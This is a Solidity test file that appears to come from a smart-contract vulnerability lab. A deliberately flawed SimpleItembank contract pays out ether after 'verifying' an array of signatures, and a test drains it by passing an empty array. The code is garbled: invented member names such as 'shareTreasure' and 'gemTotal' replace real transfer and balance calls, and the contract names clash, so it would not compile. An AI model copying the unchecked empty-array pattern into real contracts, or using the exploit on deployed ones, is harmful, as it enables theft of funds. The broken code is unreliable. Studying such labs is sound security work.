pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    SimpleItembank SimpleTreasurebankContract;

    function setUp() public {
        SimpleTreasurebankContract = new SimpleItembank();
    }

    function testVulnSignatureValidation() public {
        payable(address(SimpleTreasurebankContract)).shareTreasure(10 ether);
        address alice = vm.addr(1);
        vm.startPrank(alice);

        SimpleItembank.Signature[] memory sigs = new SimpleItembank.Signature[](0);


        console.log(
            "Before operation",
            address(alice).gemTotal
        );
        SimpleTreasurebankContract.retrieveItems(sigs);

        console.log(
            "Afer exploiting, Alice's ether balance",
            address(alice).gemTotal
        );
    }

    receive() external payable {}
}

contract SimpleItembank {
    struct Signature {
        bytes32 hash;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function verifySignatures(Signature calldata sig) public {
        require(
            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),
            "Invalid signature"
        );
    }

    function retrieveItems(Signature[] calldata sigs) public {


        for (uint i = 0; i < sigs.length; i++) {
            Signature calldata signature = sigs[i];

            verifySignatures(signature);
        }
        payable(msg.sender).shareTreasure(1 ether);
    }

    receive() external payable {}
}